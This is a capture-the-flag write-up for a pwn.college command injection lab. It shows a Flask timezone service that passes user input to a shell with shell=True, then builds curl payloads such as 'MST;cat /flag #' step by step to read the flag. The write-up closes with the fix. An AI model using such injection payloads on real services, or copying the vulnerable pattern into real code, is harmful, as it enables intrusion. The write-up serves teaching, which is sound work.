@@ -1,0 +1,294 @@
+Lab: Command Injection 4
+
+Platform: pwn.college
+Category: Web Security → Command Injection
+
+Description
+
+This level contains a timezone service. The application takes a timezone supplied by the user and passes it directly into a Linux shell command.
+
+The goal is to exploit this command injection vulnerability to execute an unintended command and retrieve the flag.
+
+Steps
+1. Go to the challenge directory
+cd /challenge
+
+This moves us into the directory containing the challenge files.
+
+2. Read the server code
+cat server
+
+The important part of the server is:
+
+arg = flask.request.args.get("tzone", "MST")
+command = f"TZ={arg} date"
+
+The user controls the tzone parameter.
+
+For example, if we send:
+
+tzone=EST
+
+then:
+
+arg = "EST"
+
+and the application creates:
+
+TZ=EST date
+3. Understand how the command is executed
+
+The application then runs:
+
+result = subprocess.run(
+    command,
+    shell=True,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    encoding="latin",
+).stdout
+
+The important part is:
+
+shell=True
+
+This means the command is interpreted by the Linux shell.
+
+Therefore, shell metacharacters such as:
+
+;
+&
+|
+$
+`
+#
+
+can have special meaning.
+
+Because arg is inserted directly into the command, we can potentially inject another command.
+
+4. Start the server
+
+Run:
+
+/challenge/server
+
+The server starts on:
+
+http://challenge.localhost:80
+
+Keep this terminal running.
+
+5. Test the timezone service normally
+
+Open another terminal and run:
+
+curl "http://challenge.localhost/stage?tzone=EST"
+
+The server constructs:
+
+TZ=EST date
+
+and returns the current time using the EST timezone.
+
+The important thing is that our input appears directly inside the command.
+
+6. Understand the command injection
+
+The normal command is:
+
+TZ=EST date
+
+Now suppose we provide:
+
+EST;whoami
+
+The server constructs:
+
+TZ=EST;whoami date
+
+The ; tells the shell:
+
+End the first command and start another command.
+
+Therefore, the shell executes:
+
+TZ=EST
+
+and then:
+
+whoami date
+
+This demonstrates that we can influence the shell beyond the intended TZ value.
+
+7. URL-encode the command separator
+
+When sending special characters through a URL, we can URL-encode them.
+
+The semicolon is:
+
+;
+
+and its URL-encoded representation is:
+
+%3B
+
+So we can test:
+
+curl "http://challenge.localhost/stage?tzone=MST%3Bwhoami"
+
+The web server decodes the URL parameter to approximately:
+
+MST;whoami
+
+The Python application therefore constructs:
+
+TZ=MST;whoami date
+
+This confirms that our input is being interpreted by the shell.
+
+8. Inject a command to read the flag
+
+The goal is to execute:
+
+cat /flag
+
+We can inject it after the semicolon.
+
+The space character can be URL-encoded as:
+
+%20
+
+Therefore:
+
+curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag"
+
+is decoded approximately as:
+
+MST;cat /flag
+
+The application constructs:
+
+TZ=MST;cat /flag date
+
+The shell interprets the semicolon as a command separator.
+
+9. Use # to remove the remaining command
+
+There is a small problem with the previous payload.
+
+The application automatically adds:
+
+date
+
+after our input.
+
+So we can use the shell comment character:
+
+#
+
+Everything after # on that shell command line is ignored.
+
+URL encoding for # is:
+
+%23
+
+Therefore, the final payload is:
+
+curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag%20%23"
+
+The decoded input is:
+
+MST;cat /flag #
+
+The application constructs:
+
+TZ=MST;cat /flag # date
+
+The shell effectively executes:
+
+TZ=MST
+
+followed by:
+
+cat /flag
+
+The final:
+
+# date
+
+is treated as a comment and isn't executed.
+
+Why the attack works
+
+The original application expects:
+
+tzone=MST
+
+and intends to create:
+
+TZ=MST date
+
+But we supply:
+
+MST;cat /flag #
+
+which causes the application to create:
+
+TZ=MST;cat /flag # date
+
+The shell interprets this as two commands:
+
+TZ=MST
+
+and:
+
+cat /flag
+
+The second command was never intended by the developer.
+
+URL Encoding Used
+Character	URL encoding	Purpose
+;	%3B	Separates shell commands
+space	%20	Separates command arguments
+#	%23	Comments out the remaining command
+
+So:
+
+MST;cat /flag #
+
+becomes:
+
+MST%3Bcat%20/flag%20%23
+Final Command
+curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag%20%23"
+Vulnerable code
+arg = flask.request.args.get("tzone", "MST")
+command = f"TZ={arg} date"
+
+subprocess.run(
+    command,
+    shell=True,
+    ...
+)
+Core vulnerability
+User input
+    ↓
+tzone=MST;cat /flag #
+    ↓
+Python string formatting
+    ↓
+TZ=MST;cat /flag # date
+    ↓
+shell=True
+    ↓
+Shell interprets ;
+    ↓
+cat /flag
+    ↓
+FLAG
+Conclusion
+
+The vulnerability occurs because untrusted user input is directly inserted into a shell command and executed with shell=True.
+
+The key lesson is that shell metacharacters such as ; are not ordinary characters when the input reaches a shell. A safer implementation would avoid constructing a shell command string and instead pass arguments directly to subprocess.run() without shell=True.
